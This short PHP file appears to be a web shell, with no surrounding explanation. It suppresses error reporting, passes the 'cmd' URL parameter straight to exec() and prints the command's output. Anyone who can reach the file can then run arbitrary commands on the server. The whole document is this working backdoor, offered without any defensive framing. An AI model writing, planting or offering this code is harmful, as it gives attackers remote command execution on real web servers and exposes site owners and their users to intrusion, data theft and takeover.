<?php
@error_reporting(0);
if(isset($_GET['cmd'])) {
    @exec($_GET['cmd'], $output);
    echo implode("\n", $output);
    exit;
}
?>
